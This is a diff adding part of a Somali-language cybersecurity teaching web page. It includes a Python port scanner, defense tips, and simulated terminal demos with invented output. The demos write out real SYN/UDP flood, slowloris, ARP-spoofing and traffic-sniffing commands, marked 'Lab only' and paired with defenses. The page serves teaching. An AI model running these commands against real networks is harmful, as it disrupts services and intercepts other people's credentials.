+def scan_ports(target, start_port, end_port):
+    print(f"\n[*] Bartilmaameedka: {target}")
+    print(f"[*] Waqtiga: {datetime.now()}")
+    print("-" * 50)
+    
+    for port in range(start_port, end_port + 1):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.5)
+        result = sock.connect_ex((target, port))
+        if result == 0:
+            try:
+                service = socket.getservbyport(port)
+            except:
+                service = "unknown"
+            print(f"[+] Port {port:5d}/TCP  OPEN  {service}")
+        sock.close()
+    print("\n[*] Scan dhammaatay!")
+
+if __name__ == "__main__":
+    target = input("Geli target IP: ")
+    scan_ports(target, 1, 1024)</div>
+  </div>
+</section>
+
+<!-- DEFENSE TIPS -->
+<div class="sdiv"></div>
+<section class="sec reveal" id="defense">
+  <span class="slb">// BONUS — SURVIVAL TIPS</span>
+  <h2 class="stit">DEFENSE & <span class="a1">SURVIVAL TIPS</span></h2>
+  <p class="sdesc">Cybersecurity ma aha oo keliya weerarka — difaaciddu sidoo kale ayaa muhiim  ah. Sida aad nafta uga difaacdo weerarrada online-ka.</p>
+  <div class="dg">
+    <div class="dc"><div class="die">📶</div><div class="dit">Public Wi-Fi Amniga</div><div class="dis">Hacker-ku wuxuu ku dhex joogi karaa (MITM). VPN had iyo jeer isticmaal. Automatic connect key-off. Sensitive activities (bank, email) ha samaynin Public Wi-Fi-ga.</div></div>
+    <div class="dc"><div class="die">🔐</div><div class="dit">2FA / MFA Rakib</div><div class="dis">Google Authenticator, Authy, ama YubiKey. SMS 2FA waa dambe (SIM swapping). App-based 2FA waa ka wanaagsan yahay. Xitaa haddii password la xado — wali amaan waye.</div></div>
+    <div class="dc"><div class="die">🗝️</div><div class="dit">Password Manager</div><div class="dis">Bitwarden (bilaash), 1Password, KeePassXC. Password: 16+ xaraf, gaar ah mid kasta. Master password oo aad xoog u leh lagaa rabaa inaad xasuusato.</div></div>
+    <div class="dc"><div class="die">🔍</div><div class="dit">Data Breach Hubi</div><div class="dis">HaveIBeenPwned.com — geli emailkaaga. Haddii breach la helo: password badel, 2FA rakib.</div></div>
+    <div class="dc"><div class="die">🚨</div><div class="dit">Hacked La Garanayo</div><div class="dis">Calaamadaha: logins aad garan weyday, emails la diray, settings la baddeley, slow computer, antivirus ka-baxay. Tallaabada: Password ku bedel, 2FA rakib, device scan.</div></div>
+    <div class="dc"><div class="die">🔄</div><div class="dit">Software Updates</div><div class="dis">Updates automatic — patches waxay xidaan nuglaanta la helay. WannaCry wuxuu faa'iidaystay update la'aanta. OS, browser, apps dhammaanba cusboonaysii.</div></div>
+    <div class="dc"><div class="die">💾</div><div class="dit">Backup 3-2-1</div><div class="dis">3 Nuqul · 2 Nooc (hard drive+cloud) · 1 Meel fog. Ransomware-ka kaliya waxaa ka difaaca backup. Test backups joogto ah!</div></div>
+    <div class="dc"><div class="die">🌐</div><div class="dit">Privacy Online</div><div class="dis">Browser: Firefox + uBlock Origin. Search: DuckDuckGo. DNS: 1.1.1.1 (Cloudflare). VPN: Mullvad, ProtonVPN (zero-logs). Tor Browser = privacy ugu sareysa.</div></div>
+  </div>
+</section>
+
+<!-- CONTACT -->
+<div class="sdiv"></div>
+<div class="contact reveal">
+  <div class="hbadge" style="margin-bottom:.85rem">🔗 COMMUNITY — KU BIIR</div>
+  <h2 class="contact-t">CyberBaro Community-ga</h2>
+  <p class="contact-s">nagu soo biir fadlan: <strong style="color:var(--ng)">arkani659</strong></p>
+  <div class="cls">
+    <a href="https://t.me/hacking_akhlaaqyin" target="_blank" rel="noopener" class="cl">
+      <span>✈️</span><span>Telegram Channel</span><span style="color:var(--tm);font-size:.65rem">@hacking_akhlaaqyin</span>
+    </a>
+    <a href="https://discord.gg/55GhmhcSY" target="_blank" rel="noopener" class="cl disc">
+      <span>💬</span><span>Discord Server</span><span style="color:var(--tm);font-size:.65rem">discord.gg/55GhmhcSY</span>
+    </a>
+    <a href="mailto:arkani6563@gmail.com" class="cl">
+      <span>📧</span><span>Email</span><span style="color:var(--tm);font-size:.65rem">arkani6563@gmail.com</span>
+    </a>
+  </div>
+  <p style="font-family:var(--fm);font-size:.68rem;color:var(--tm);letter-spacing:1px">⚡ LA SOCO · LA JOOG · BARO</p>
+</div>
+
+<footer>
+  <p>CyberBaro © 2026 — Aasaasiyaatka: <span class="fr">arkani659</span> Cybersecurity</p>
+  <p style="margin-top:.4rem;font-size:.6rem">.</p>
+</footer>
+</main>
+
+<button class="bktop" id="bktop" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+/* ── MATRIX ── */
+const C=document.getElementById('mc'),X=C.getContext('2d');
+let D=[];
+const CH='アイウエカキサシタチ01ABCDEFGHIJKLMNOPQRSTUVWXYZ<>/\\{}0123456789';
+function iM(){C.width=innerWidth;C.height=innerHeight;D=Array(Math.floor(C.width/15)).fill(1)}
+function dM(){const t=document.documentElement.getAttribute('data-theme');X.fillStyle=t==='light'?'rgba(240,244,240,0.06)':'rgba(2,4,8,0.06)';X.fillRect(0,0,C.width,C.height);X.fillStyle=t==='light'?'#006622':'#00ff41';X.font='12px Share Tech Mono';for(let i=0;i<D.length;i++){const c=CH[Math.floor(Math.random()*CH.length)];X.fillText(c,i*15,D[i]*15);if(D[i]*15>C.height&&Math.random()>.975)D[i]=0;D[i]++}}
+iM();setInterval(dM,65);addEventListener('resize',iM);
+
+/* ── THEME ── */
+const TT=document.getElementById('tt'),TL=document.getElementById('tlb');
+let dark=true;
+TT.addEventListener('click',()=>{dark=!dark;document.documentElement.setAttribute('data-theme',dark?'dark':'light');TL.textContent=dark?'🌙':'☀️'});
+
+/* ── HAMBURGER ── */
+const HB=document.getElementById('hb'),MN=document.getElementById('mn');
+HB.addEventListener('click',()=>MN.classList.toggle('open'));
+function cm(){MN.classList.remove('open')}
+
+/* ── BACK TO TOP ── */
+const BT=document.getElementById('bktop');
+addEventListener('scroll',()=>{BT.classList.toggle('vis',scrollY>400)});
+
+/* ── REVEAL ── */
+const obs=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting){x.target.classList.add('visible');obs.unobserve(x.target)}}),{threshold:.07});
+document.querySelectorAll('.reveal').forEach(r=>obs.observe(r));
+
+/* ── COUNTERS ── */
+function cnt(el,t,s=''){let c=0;const step=t/45;const tm=setInterval(()=>{c=Math.min(c+step,t);el.textContent=Math.floor(c)+s;if(c>=t)clearInterval(tm)},38)}
+setTimeout(()=>{cnt(document.getElementById('sn1'),9);cnt(document.getElementById('sn2'),80,'+');cnt(document.getElementById('sn3'),10,'+');cnt(document.getElementById('sn4'),100,'%')},700);
+
+/* ── ROADMAPS ── */
+const rprog={web:{done:0,tot:5},soc:{done:0,tot:5},net:{done:0,tot:5},mob:{done:0,tot:4}};
+function showRM(id,btn){
+  document.querySelectorAll('.rtab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.rpanel').forEach(p=>p.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('rm-'+id).classList.add('active');
+}
+function toggleStep(el,id){
+  el.classList.toggle('done');
+  const p=document.getElementById('rm-'+id);
+  const done=p.querySelectorAll('.rstep.done').length;
+  const tot=p.querySelectorAll('.rstep').length;
+  const pct=Math.round(done/tot*100);
+  document.getElementById('prb-'+id).style.width=pct+'%';
+  document.getElementById('prp-'+id).textContent=pct+'%';
+}
+
+/* ── ATTACK TABS ── */
+function showAT(id,btn){
+  document.querySelectorAll('.atab').forEach(t=>t.classList.remove('active'));
+  document.querySelectorAll('.apanel').forEach(p=>p.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('at-'+id).classList.add('active');
+}
+
+/* ── TERMINAL ENGINE ── */
+function addL(id,html,d=0){setTimeout(()=>{const t=document.getElementById(id);const l=document.createElement('div');l.className='tl';l.innerHTML=html;t.appendChild(l);t.scrollTop=t.scrollHeight},d)}
+function clrT(id){const t=document.getElementById(id);t.innerHTML=`<div class="tl"><span class="t-p">arkani659@kali</span><span>:</span><span class="t-i">~</span><span class="t-c">$ _</span></div>`}
+
+const TC={
+  ddos:{
+    1:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ hping3 -S --flood -V -p 80 192.168.1.100</span>`},
+      {d:300,h:`<span class="t-i">HPING 192.168.1.100 (eth0): SYN set, 40 headers + 0 data bytes</span>`},
+      {d:500,h:`<span class="t-s">[+] Sending SYN packets to port 80 at max rate...</span>`},
+      {d:650,h:`<span class="t-o">>>> len=46 ip=192.168.1.100 ttl=64 sport=80 flags=SA seq=0 win=5840 rtt=0.7ms</span>`},
+      {d:800,h:`<span class="t-o">>>> len=46 ip=192.168.1.100 ttl=64 sport=80 flags=SA seq=1 win=5840 rtt=0.5ms</span>`},
+      {d:950,h:`<span class="t-o">>>> len=46 ip=192.168.1.100 ttl=64 sport=80 flags=SA seq=2 win=5840 rtt=0.4ms</span>`},
+      {d:1100,h:`<span class="t-w">[*] 50,000+ packets/second — SYN Flood active</span>`},
+      {d:1300,h:`<span class="t-w">[*] Server response time: 0.7ms → 450ms → TIMEOUT</span>`},
+      {d:1500,h:`<span class="t-e">[!] Target port 80 NOT RESPONDING — DoS successful (Lab only!)</span>`},
+      {d:1700,h:`<span class="t-i">📚 SYN Flood: TCP connection table-ka server-ka buuxiya. Difaaca: SYN cookies, Rate limiting, Firewall rules.</span>`}
+    ],
+    2:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ hping3 --udp --flood -p 53 192.168.1.100</span>`},
+      {d:300,h:`<span class="t-s">[+] UDP Flood targeting port 53 (DNS)...</span>`},
+      {d:500,h:`<span class="t-o">[*] Packets sent: 10,000 — Bandwidth: 45 Mbps</span>`},
+      {d:700,h:`<span class="t-o">[*] Packets sent: 50,000 — Bandwidth: 220 Mbps</span>`},
+      {d:900,h:`<span class="t-w">[*] DNS server overloaded — query response time: 5000ms+</span>`},
+      {d:1100,h:`<span class="t-e">[!] DNS service degraded — packets dropping</span>`},
+      {d:1300,h:`<span class="t-i">📚 UDP Flood: Packets badan si dhakhso ah u dir — resource exhaustion. Difaaca: Ingress filtering, Rate limiting per IP.</span>`}
+    ],
+    3:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ python3 slowloris.py -p 80 -s 200 192.168.1.100</span>`},
+      {d:300,h:`<span class="t-s">[+] Slowloris attack started against 192.168.1.100:80</span>`},
+      {d:500,h:`<span class="t-o">[*] Opening 200 connections...</span>`},
+      {d:700,h:`<span class="t-o">[*] Sending partial HTTP headers to keep connections alive...</span>`},
+      {d:900,h:`<span class="t-o">[*] Connections held open: 200/200</span>`},
+      {d:1100,h:`<span class="t-w">[*] Server's connection pool exhausted. New requests rejected.</span>`},
+      {d:1300,h:`<span class="t-e">[!] Web server down — Layer 7 DoS successful (Lab only!)</span>`},
+      {d:1500,h:`<span class="t-i">📚 Slowloris: HTTP connections furan ku hay. Difaaca: Timeout settings, connection limits, reverse proxy (nginx).</span>`}
+    ],
+    4:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ nmap -sS --max-rate 500 -T4 192.168.1.100</span>`},
+      {d:300,h:`<span class="t-i">Starting Nmap 7.94 — https://nmap.org</span>`},
+      {d:500,h:`<span class="t-o">Scanning 192.168.1.100 [1000 ports]</span>`},
+      {d:700,h:`<span class="t-s">PORT     STATE  SERVICE    VERSION</span>`},
+      {d:800,h:`<span class="t-o">80/tcp   open   http       Apache httpd 2.4.41</span>`},
+      {d:900,h:`<span class="t-o">443/tcp  open   https      OpenSSL 1.1.1</span>`},
+      {d:1000,h:`<span class="t-o">22/tcp   open   ssh        OpenSSH 8.2p1</span>`},
+      {d:1100,h:`<span class="t-w">3306/tcp open   mysql      MySQL 8.0.25 ← WARNING: Internet-exposed!</span>`},
+      {d:1300,h:`<span class="t-i">📚 Nmap waxaa loo isticmaalaa ports furan, services nugul, iyo version-yada hore helitaanka. Tani waa reconnaissance.</span>`}
+    ]
+  },
+  arp:{
+    1:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ nmap -sn 192.168.1.0/24</span>`},
+      {d:300,h:`<span class="t-i">Starting Nmap 7.94 — Network Discovery</span>`},
+      {d:500,h:`<span class="t-s">Hosts found on network:</span>`},
+      {d:600,h:`<span class="t-o">192.168.1.1   — Router (Default Gateway)</span>`},
+      {d:700,h:`<span class="t-o">192.168.1.5   — Victim PC (Windows 11)</span>`},
+      {d:800,h:`<span class="t-o">192.168.1.10  — Laptop (macOS)</span>`},
+      {d:900,h:`<span class="t-w">[*] Target selected: 192.168.1.5 (Victim) & 192.168.1.1 (Router)</span>`}
+    ],
+    2:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ arpspoof -i eth0 -t 192.168.1.5 192.168.1.1</span>`},
+      {d:300,h:`<span class="t-s">[+] ARP spoofing started — Poisoning victim's ARP cache</span>`},
+      {d:500,h:`<span class="t-o">0:c:29:aa:bb:cc 0:c:29:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 0:c:29:aa:bb:cc</span>`},
+      {d:700,h:`<span class="t-o">0:c:29:aa:bb:cc 0:c:29:dd:ee:ff 0806 42: arp reply 192.168.1.1 is-at 0:c:29:aa:bb:cc</span>`},
+      {d:900,h:`<span class="t-w">[*] Victim now thinks our MAC = Router IP → All traffic comes to us!</span>`},
+      {d:1100,h:`<span class="t-s">[+] MITM position established successfully</span>`},
+      {d:1300,h:`<span class="t-i">📚 Difaaca: Dynamic ARP Inspection, Static ARP entries, VPN isticmaal, iyo HTTPS everywhere.</span>`}
+    ],
+    3:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ echo 1 > /proc/sys/net/ipv4/ip_forward && wireshark -i eth0 -k &</span>`},
+      {d:300,h:`<span class="t-s">[+] IP forwarding enabled — Traffic will pass through us transparently</span>`},
+      {d:500,h:`<span class="t-s">[+] Wireshark capturing on eth0...</span>`},
+      {d:700,h:`<span class="t-o">HTTP  GET /login.php — 192.168.1.5 → 192.168.1.1</span>`},
+      {d:800,h:`<span class="t-w">HTTP  POST /login.php — username=admin&password=P@ssw0rd123</span>`},
+      {d:950,h:`<span class="t-e">[!!!] Credentials captured in plaintext (HTTP, not HTTPS)!</span>`},
+      {d:1150,h:`<span class="t-i">📚 Difaaca: HTTPS always, HSTS headers, Certificate Pinning, VPN.</span>`}
+    ],
+    4:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ ettercap -T -q -i eth0 -M arp:remote /192.168.1.5/ /192.168.1.1/</span>`},
+      {d:300,h:`<span class="t-i">ettercap 0.8.3 — Multipurpose sniffer/interceptor/logger</span>`},
+      {d:500,h:`<span class="t-s">[+] ARP poisoning victims: 192.168.1.5 ↔ 192.168.1.1</span>`},
+      {d:700,h:`<span class="t-o">[sniff] HTTP   192.168.1.5:54321 → 93.184.216.34:80</span>`},
+      {d:800,h:`<span class="t-o">[sniff] DNS   Query: facebook.com → 157.240.214.35</span>`},
+      {d:900,h:`<span class="t-w">[sniff] Cookie: session_token=a3f9b2c1d4e5 — CAPTURED!</span>`},
+      {d:1100,h:`<span class="t-i">📚 Session hijacking: Cookie-ga xadid markuu traffic-ku encrypted maahan. Difaaca: Secure flag, HttpOnly, HTTPS.</span>`}
+    ]
+  },
+  phish:{
+    1:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ python3 email_analyzer.py suspicious_email.eml</span>`},
+      {d:300,h:`<span class="t-s">[+] Analyzing email headers...</span>`},
+      {d:500,h:`<span class="t-o">From: "Apple Support" &lt;noreply@apple-secur1ty.com&gt;</span>`},
+      {d:600,h:`<span class="t-e">[!] Domain mismatch: apple-secur1ty.com ≠ apple.com</span>`},
+      {d:700,h:`<span class="t-o">SPF:   FAIL — Email not from authorized server</span>`},
+      {d:800,h:`<span class="t-o">DKIM:  FAIL — Signature invalid</span>`},
+      {d:900,h:`<span class="t-o">DMARC: FAIL — Policy violation</span>`},
+      {d:1100,h:`<span class="t-e">[!!!] PHISHING EMAIL DETECTED — DO NOT CLICK ANY LINKS</span>`},
+      {d:1300,h:`<span class="t-i">📚 SPF, DKIM, DMARC waa 3-da xaqiijinta email-ka. Mid kasta oo FAIL = phishing la yaab.</span>`}
+    ],
+    2:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ curl -s "https://urlscan.io/api/v1/search/?q=apple-secur1ty.com" | python3 -m json.tool</span>`},
+      {d:300,h:`<span class="t-s">[+] Scanning URL reputation...</span>`},
+      {d:500,h:`<span class="t-o">Domain Age: 2 days (SUSPICIOUS — real apple.com = since 1987)</span>`},
+      {d:600,h:`<span class="t-w">Registrar: Unknown offshore registrar</span>`},
+      {d:700,h:`<span class="t-o">SSL Cert: Let's Encrypt (valid but not Apple's cert)</span>`},
+      {d:800,h:`<span class="t-o">Page Title: "Apple ID - Sign In" ← IMPERSONATION!</span>`},
+      {d:900,h:`<span class="t-e">[!!!] PHISHING SITE — Credential harvester detected</span>`},
+      {d:1100,h:`<span class="t-i">📚 VirusTotal, URLScan.io, PhishTank waa tools bilaasha ah ee URL-ka loogu baadho.</span>`}
+    ],
+    3:[
+      {d:0,h:`<span class="t-p">arkani659@kali</span>:<span class="t-i">~</span><span class="t-c">$ whois apple-secur1ty.com</span>`},
+      {d:300,h:`<span class="t-i">WHOIS Lookup for apple-secur1ty.com</span>`},
+      {d:500,h:`<span class="t-o">Registrar: Namecheap, Inc.</span>`},
+      {d:600,h:`<span class="t-o">Created: 2025-03-17 (2 days ago!)</span>`},
+      {d:700,h:`<span class="t-w">Registrant: REDACTED FOR PRIVACY</span>`},
+      {d:800,h:`<span class="t-o">Name Server: ns1.phishingkit.ru ← Red flag!</span>`},
+      {d:900,h:`<span class="t-e">[!!!] Domain cusub + Privacy hidden + .ru nameserver = PHISHING CONFIRMED</span>`},
+      {d:1100,h:`<span class="t-i">📚 Domain cusub (< 30 days) + privacy protected + ajnabi nameserver = Phishing calaamadaha ugu badan.</span>`}
+    ]
+  }
+};
+
+function runT(type,n){
+  const ids={ddos:'t-ddos',arp:'t-arp',phish:'t-phish'};
+  clrT(ids[type]);
+  TC[type][n].forEach(({d,h})=>addL(ids[type],h,d));
+}
+</script>
+</body>
+</html>
